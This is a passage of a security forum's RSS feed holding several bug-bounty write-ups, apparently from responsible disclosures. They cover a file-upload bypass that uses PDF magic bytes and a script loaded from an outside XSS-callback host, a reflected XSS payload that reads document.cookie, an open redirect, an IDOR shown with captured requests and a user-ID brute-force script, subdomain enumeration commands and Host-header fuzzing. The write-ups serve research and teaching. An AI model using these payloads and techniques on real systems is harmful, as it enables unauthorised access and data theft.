<p>While examining the service I tried to upload a basic “hello world” HTML file. But it was immediately rejected. The file wasn’t even probed to be uploaded so I guessed a content inspection didn’t even take place. So maybe the first obstacle was the filename itself. Changing the filename from <code>file.html</code> to <code>file.html.pdf</code> got the file to be accepted.</p>
<p>After that, I hit “Upload” but the file got rejected again. This is where the content inspection (if that’s the correct way to say it) took place.</p>
<p>At this point I had to trick the system and make it believe that this was indeed a pdf file. Here I have to thank <a href="https://www.hackthebox.eu/">HTB</a>, as this is where I first learned about bypassing protection with File Signatures or also known as <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Magic Bytes</a>. Adding the signature <code>%PDF-1.</code> at the top of the HTML file, I could bypass the protection. Also, by changing the Content-Type of the file from <code>application/pdf</code> to <code>text/html</code> the file was getting downloaded and opened as a HTML file. I added the a basic XSS payload in orded to get notified if the employee opened the file (because I thought that if they saw a HTML file they would automatically delete/dismiss it. So the file at the end looked like this:</p>
<pre><code class="lang-auto">$ cat fileupload.html.pdf 
%PDF-1.
&lt;html&gt;
&lt;script src=https://vict0ni.xss.ht&gt;&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>Even though there wasn’t any cookies to steal, because the file was not rendered inside the company’s system (sadly, for me, as this would have opened ways for possible RCE), it served the purpose of notifying me in case the file was opened and getting some information, like the employee’s IP and geolocation, their web browser, OS and path <code>file:///C:/Users/[employee's name]/Downloads/</code>. While this info is not useful for me as a bug hunter, they can be useful for adversaries. I also tested the vulnerability for .exe files and I was successful again.</p>
<h6>Source: OWASP</h6>
<p><span alt="screenshot_1" data-base62-sha1="5aHaMiDafp6CswUdLiDO1zFMG6g" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>I hope you learned something from my experience!</p>
<p>Bonus: The file upload service was also vulnerable to CSRF, which means that I could also upload a malicious file via another user and also possibly infect them, as the uploaded CV can also be downloaded by the users themselves. So always try to chain each vulnerability you find to maximize the severity!</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/unrestricted-cv-file-upload/20325">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/unrestricted-cv-file-upload/20325</link>
          <pubDate>Tue, 07 Apr 2020 12:29:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20325</guid>
          <source url="https://0x00sec.org/t/unrestricted-cv-file-upload/20325.rss">Unrestricted CV File Upload</source>
        </item>
        <item>
          <title>What is your go-to DNS enumeration methodology? [Discussion]</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Hey 0x00ers!</p>
<p>I have been doing a lot of research lately around getting the best coverage when it comes to DNS enumeration. If you’re on a red team and doing asset discovery, or if you’re a bug bounty hunter and you get given scope with <code>*.example.com</code>, DNS enumeration is usually massively important to get right but also not miss anything in the process.</p>
<p>Personally, my DNS enumeration looks a lot like the following:</p>
<p>I run subfinder:</p>
<pre><code class="lang-bash">subfinder -d uber.com &gt;&gt; 
</code></pre>
<p>Then I’ll use amass, Amass is great because it pulls from a LOT of different sources and perms a lot of enumeration techniques to get really great coverage, this includes certificate transparency, DNS dumpster, Rapid7 Sonar, Google and loads of other sources.</p>
<pre><code class="lang-bash">amass enum -d uber.com
</code></pre>
<p>Then, just to make sure I didn’t miss anything, I’ll do a full on DNS bruteforce using MassDNS or ZDNS.</p>
<p>I’ve recently taken to using my new tool <a href="https://github.com/pry0cc/subgen">subgen</a>, which just takes a wordlist as STDIN, concates your domain with the wordlist, and doesn’t allow the same subdomain string to be printed more than once (unique).</p>
<p>From this, you can pipe into whatever resolver tool you like best.</p>
<p>As far as wordlists go, I am a big fan of a sorted Jason Haddix’s all.txt, <a href="https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056">https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056</a></p>
<pre><code class="lang-auto">cat ~/lists/sorted-all.txt | subgen -d uber.com | zdns A | jq -r "select(.data.answers[0].name) | .name" 
</code></pre>
<p>This is truly one of the fastest ways to all out bruteforce right now, a full bruteforce using that 25MB list takes a total of 20 minutes with Cloudflare DNS on a Digital Ocean SFO2 droplet, if you use MassDNS you can get it down to 10 minutes, just make sure you use the right resolvers with MassDNS.</p>
<pre><code class="lang-auto">cat ~/lists/jhaddix-all.txt | subgen -d uber.com |  massdns -r dns.txt -t A -o S -w results.txt
</code></pre>
<p>And use this for DNS (my best list right now, credit to <span class="mention">@R3D_Z3R0</span> on Twitter.)</p>
<pre><code class="lang-nohighlight">1.1.1.1
1.0.0.1
8.8.8.8
8.8.4.4
8.26.56.26
8.20.247.20
9.9.9.9
149.112.112.112
64.6.64.6
64.6.65.6
208.67.222.222
208.67.220.220
185.228.168.9
185.228.169.9
198.101.242.72
23.253.163.53
176.103.130.130
176.103.130.131
</code></pre>
<p>So - this brings me onto you, what do you use for your DNS enumeration methodology? Share with everybody so that we have a big resource here!</p>
            <p><small>11 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/what-is-your-go-to-dns-enumeration-methodology-discussion/20169">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/what-is-your-go-to-dns-enumeration-methodology-discussion/20169</link>
          <pubDate>Tue, 31 Mar 2020 19:27:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20169</guid>
          <source url="https://0x00sec.org/t/what-is-your-go-to-dns-enumeration-methodology-discussion/20169.rss">What is your go-to DNS enumeration methodology? [Discussion]</source>
        </item>
        <item>
          <title>XSS on Cookie Pop-up</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <blockquote>
<p>Never trust pop-ups</p>
</blockquote>
<p>While doing some bug hunting (actually, in this case it was just a responsible disclosure) on a website, I entered a XSS payload as a subdirectory in the URL, in order to see if and how it was reflected on the source code. It’s one of the first things I do when I manual test a site for XSS. For this I always use a payload with common characters used in XSS payloads that are filtered under the fear of inserting js code. After entering the</p>
<p><code>https://website.com/"&gt;&lt;/&gt;{}()vict0ni</code></p>
<p>I got a custom 404 response page. Looking at the source code, the URL was reflected in 3 places. In the two of them the payload was sanitized, but on the third one everything were getting reflected as they were. The source code for the third reflection looked something like this:</p>
<pre><code class="lang-auto">&lt;input type="hidden" name="DismissCookieNotice" value="true" /&gt;
&lt;input type="hidden" name="redirected" value="https://www.website.com/"&gt;&lt;/&gt;{}()vict0ni" /&gt;
&lt;input type="hidden" name="csrf" value=[something] /&gt;
</code></pre>
<p>So by entering the payload</p>
<p><code>https://website.com/"/&gt;&lt;svg onload=alert(document.cookie)&gt;</code></p>
<p>an XSS was triggered.</p>
<p>Everything was really simple. I browsed the website a little bit just to see how it was structured and then I went back to retest the XSS, just to be sure. Only this time… it didn’t work.</p>
<p>I tried to think of what could have changed between now and the time I triggered the XSS. I was changing parameters, payloads, user agents, basically everything. Still nothing.<br>
Then, after some tries, I thought of re-entering the URL on a private session. That’s where the XSS got triggered again!</p>
<p><img src="/uploads/default/original/2X/b/bab7eae36842a2d016e878744dcfa30619b12a08.gif" alt="wut" data-base62-sha1="qDMQLf0OSLAc6InHq3ZLO2qEKKc" width="300" height="185"></p>
<p>This happened because on the private session I didn’t click the “Accept Cookies” option on the pop-up that now every website is forced to provide. But I did it while browsing the website <strong>after</strong> finding the XSS. To be honest, I could have probably noticed that earlier in the <strong>DismissCookieNotice</strong> name in the source code.</p>
<p><em>To recall:</em></p>
<pre><code class="lang-auto">...
&lt;input type="hidden" name="DismissCookieNotice" value="true" /&gt;
...
</code></pre>
<p>The vulnerability was inside the code for the pop-up (after accepting the cookies, the page refreshed and the pop-up source code was missing from the new page). So the XSS could be reproduced only by ignoring the Cookie pop-up (not dismissing it, just by ignoring it).<br>
The logic behind this pop-up was that after accepting the cookies, the website would redirect the user to the URL he already was. That’s why the URL was reflected in the “redirected” hidden input. But they forgot to filter the user input.</p>
<p>Next time you test for a reflected XSS, make sure to test it <strong>before</strong> you accept the cookies. You never know!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/xss-on-cookie-pop-up/19580">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/xss-on-cookie-pop-up/19580</link>
          <pubDate>Mon, 02 Mar 2020 21:33:55 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19580</guid>
          <source url="https://0x00sec.org/t/xss-on-cookie-pop-up/19580.rss">XSS on Cookie Pop-up</source>
        </item>
        <item>
          <title>Open redirection via login</title>
          <dc:creator><![CDATA[osama-hamad]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Note: ignore ////</p>
<p>Assuming the target was ////example.com</p>
<p>When visiting the website and navigate to Login page . The website return GET parameters , one of them was interesting as it seems good to check for open redirection.</p>
<p><a href="https://example.com/login?url=example.com/welcome" class="onebox" target="_blank" rel="nofollow noopener">https://example.com/login?url=example.com/welcome</a></p>
<p>If you tried to inject [ <span class="mention">@google.com</span> ] and log in , the website will redirect you to ////example.com<br>
If you tried to inject [ ////google.com , ////google.com , other common open redirection whitelist bypass ] it won’t work.</p>
<p>After that i checked and changed the parameter value from</p>
<p>////example.com/login?url=////example.com/welcome</p>
<p>To</p>
<p>////example.com/login?url=////example.org/welcome</p>
<p>After log in , the website will get your redirected to ////example.org/welcome</p>
<p>After checking , <a href="http://example.org" rel="nofollow noopener">example.org</a> was not paid domain and available to purchase . That being said if attacker buy it from ////namecheap.com or other domain registration service, he can got open redirection on the endpoint and redirect to its website which it is ////example.org</p>
<p>I’m here trying to write bugs , tricks in bug bounty hunting and penetration testing because i like this form + to inspire other researchers on the community to write their findings here.<br>
+</p>
<p>The reason between having //// before websites urls is because i’m new user  and i can’t post more than 2 links in a post so i put these chars.<br>
Thanks.</p>
<p>I</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/open-redirection-via-login/19240">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/open-redirection-via-login/19240</link>
          <pubDate>Sat, 15 Feb 2020 19:10:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19240</guid>
          <source url="https://0x00sec.org/t/open-redirection-via-login/19240.rss">Open redirection via login</source>
        </item>
        <item>
          <title>IDOR leads to Data leakage and Profile Update</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>In another bug bounty session of mine, I came across a bounty program of a “Contract Review” company.</p>
<p>In their web app, one could register with a first/last name, an email and their company’s name (and a password ofc).</p>
<p>Upon trying to figure out how the web app works, I updated my profile by changing my first name from “vict0ni” to “vict0ni1337”. I captured the request:</p>
<pre><code class="lang-auto">OPTIONS /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
Origin: https://app.website.com
Connection: close
</code></pre>
<p>followed by:</p>
<pre><code class="lang-auto">PUT /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
</code></pre>
<p>resulting to this response:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 13:43:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 948
Connection: close
Set-Cookie: __cfduid=db2571d1ac9e83a96ca3265b9a0bf1d4c1580996613; expires=Sat, 07-Mar-20 13:43:33 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3b4-QbbUm9x0qtqg3/Bqcixd7mbQgqw"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 560d8dc0581c4098-HAM

{"users":[{"contracts":[],"createdAt":1580425135972,"updatedAt":1580996613958,"id":"5e335fafedd93a1f35b6ca27","email":"vict0ni@bugcrowdninja.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"3measgw3gr1yjpgvddqn","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e335faeedd93a1f35b6ca26"}],"companies":[{"createdAt":1580425133542,"updatedAt":1580428552059,"id":"5e335faeedd93a1f35b6ca26","name":"BugBounty","seq":5119,"vatId":"","phone":"1337","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"zqpwr","referralExtraCredits":0,"subscription":{"id":"16A1DGRp7Up0s1Qu7","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e335faeedd93a1f35b6ca26/users","contracts":"/companies/5e335faeedd93a1f35b6ca26/contracts"}}]}
</code></pre>
<p>So I was making an OPTIONS request and then a PUT request with my personal userID <code>5e335fafedd93a1f35b6ca27</code> updating my first name (one could only change the first and last name) and responding back with a 200 HTTP response and a bunch of info about my account and my company.</p>
<p>I always make two accounts when testing a web app. I did the same thing for my second account, just to grab its userID. Then I thought what could happen if I used the userID of account B in a request to update the account A. So I did the exact same thing as described above, being authorized as a user of account A, but using the userID of account B:</p>
<pre><code class="lang-auto">PUT /users/5e3c8692f3d2c616c6ed78e9 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
</code></pre>
<p>resulting to this response:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 21:38:07 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 943
Connection: close
Set-Cookie: __cfduid=d78cefde78c34008ca49d162306b8fcfb1581025085; expires=Sat, 07-Mar-20 21:38:05 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3af-ctJNYxOVotnOZ8DYR4ejpainHVE"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 561044dd2b4fcd93-CDG

{"users":[{"contracts":[],"createdAt":1581024914019,"updatedAt":1581025085895,"id":"5e3c8692f3d2c616c6ad78e9","email":"yigoxa6599@jmail7.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"5pjs1pjjwprphpkce0rj","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e3c8690f3d2c616c6ed78e8"}],"companies":[{"createdAt":1581024911551,"updatedAt":1581024919638,"id":"5e3c8690f3d2c616c6ed78e8","name":"CompanyB","seq":5137,"vatId":"dummyVATID","phone":"1234567890","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"plozx","referralExtraCredits":0,"subscription":{"id":"16BcmbRpl5Qvt1Lwv","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e3c8690f3d2c616c6ed78e8/users","contracts":"/companies/5e3c8690f3d2c616c6ed78e8/contracts"}}]}
</code></pre>
<p>So, by changing the userID to the account B’s userID, I could update the account B’s first and last name, grab it’s mail, referral code, companyID, subscription plan, number of employees, phone number, the company’s <a href="https://en.wikipedia.org/wiki/VAT_identification_number">VAT identification number</a> etc., while being authorized as account A. With the referral code, a user could use it to gain $30 as a “gift” for getting referred by another user.</p>
<p>Probably the server did not identifiy who was sending the <code>Authorization</code> header and it was just making sure that a valid Authorization header existed.</p>
<p>While that’s all good, the userID of each account remains secret. There had to be some kind of MiTM attack to capture it and make a targeted attack. So I thought maybe I could generalize the attack, instead of targeting a single account.<br>
By using dummy userIDs, in order to test the brute-force protection, I found out that the endpoint was vulnerable to brute-force attacks. Since the userID is following a certain pattern (a string of 24 hex characters), one could generate all the possible IDs and save them into a file with this python script:</p>
<pre><code class="lang-python">import itertools

string = '0123456789abcdef'
file = open('userIDs.txt', 'w')
for p in itertools.product(string, repeat=24):
	writing = ''.join(p) + '\n'
	file.write(writing)
file.close()
</code></pre>
<p>With enough computing power, an attacker could change the first/last name of all users and grab their account and company info.</p>
<p>Thanks for reading!</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025</link>
          <pubDate>Fri, 07 Feb 2020 17:37:24 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19025</guid>
          <source url="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025.rss">IDOR leads to Data leakage and Profile Update</source>
        </item>
        <item>
          <title>Multiple Host Header Attacks after bypassing protection with... a Header Attack</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>I was searching for bug bounty programmes by using <a href="https://github.com/sushiwushi/bug-bounty-dorks/blob/master/dorks.txt">google dorks</a>, when I came across one by a company, let’s say, Example Inc. They had a ,relatively, big scope and I thought I’d give that a try.</p>
<p>After doing some recon and finding some interesting domains, I started playing with their API, <a href="https://api.example.com">https://api.example.com</a>. Recently I learned more about Host Header Injections, so I thought maybe I’ll start with that.<br>
The API was working that way, so that the user has to provide a X-API-KEY header with the value of a valid API key. If the user didn’t provide this header with a valid key, he would get a 403 response, i.e. Forbidden. I didn’t have a valid key so, as mentioned earlier, I played with the Host header.</p>
<p>To my surprise, setting the header to anything but the initial Host header value, would result to getting a 200 response, i.e. OK. Still, I couldn’t use the API, but I could enumerate directories and access the (previously inaccessible) robots.txt file, where I could partially see the structure of the website.</p>
<h3><em>Before the injection</em></h3>
<p><span alt="no_inj" data-base62-sha1="5NNX716AMbFJUYaf9erz2bavUwd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h3><em>After the injection</em></h3>
<p><span alt="after_inj" data-base62-sha1="9KkgKXtCWMs41Til87yVGnWTjiE" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Still, I was getting some 403 responses but the weird thing was that non existent directories would return a 200 response (I think the directory /vict0niIsTheBest doesn’t exist, but still got me a 200 response). That way, I couldn’t say if a directory that responded with a 200 really existed or not without looking at it’s content.</p>
<p>The directories with Content-Length greater than 0 wasn’t of any value. But I was getting some 301 responses too. Testing some directories with 301 response, I realized that, again, by changing the Host header I would get redirected to <strong>any</strong> website.</p>
<p><span alt="host_inj_pdf" data-base62-sha1="eBAMVBJwV8tYnY3IAG7eAx73xoR" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So my goal now was to find as many directories with 301 response as possible. I learned recently about a tool named <a href="https://github.com/ffuf/ffuf">ffuf</a> so I gave that a try.</p>
<pre><code class="lang-bash">ffuf -w big.txt -u "https://api.example.com/FUZZ" -H "Host: localhost" -o ~/Desktop/bugHunting/targets/example/ffuf_big_301.txt -mc 301
</code></pre>
<p>That way, I was able to find 10(!) Host header injection vulnerable endpoints after getting access to them, yet with another Host header injection!</p>
            <p><small>8 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/multiple-host-header-attacks-after-bypassing-protection-with-a-header-attack/18018">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/multiple-host-header-attacks-after-bypassing-protection-with-a-header-attack/18018</link>
          <pubDate>Thu, 12 Dec 2019 18:45:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18018</guid>
          <source url="https://0x00sec.org/t/multiple-host-header-attacks-after-bypassing-protection-with-a-header-attack/18018.rss">Multiple Host Header Attacks after bypassing protection with... a Header Attack</source>
        </item>
        <item>
          <title>About the Bug Bounty category</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>(Replace this first paragraph with a brief description of your new category. This guidance will appear in the category selection area, so try to keep it below 200 characters.)</p>
<p>Use the following paragraphs for a longer description, or to establish category guidelines or rules:</p>
<ul>
<li>
<p>Why should people use this category? What is it for?</p>
</li>
<li>
<p>How exactly is this different than the other categories we already have?</p>
</li>
<li>
<p>What should topics in this category generally contain?</p>
</li>
<li>
<p>Do we need this category? Can we merge with another category, or subcategory?</p>
</li>
</ul>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/about-the-bug-bounty-category/18017">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/about-the-bug-bounty-category/18017</link>
          <pubDate>Thu, 12 Dec 2019 18:40:53 +0000</pubDate>
          <discourse:topicPinned>Yes</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18017</guid>
          <source url="https://0x00sec.org/t/about-the-bug-bounty-category/18017.rss">About the Bug Bounty category</source>
        </item>
  </channel>
</rss>
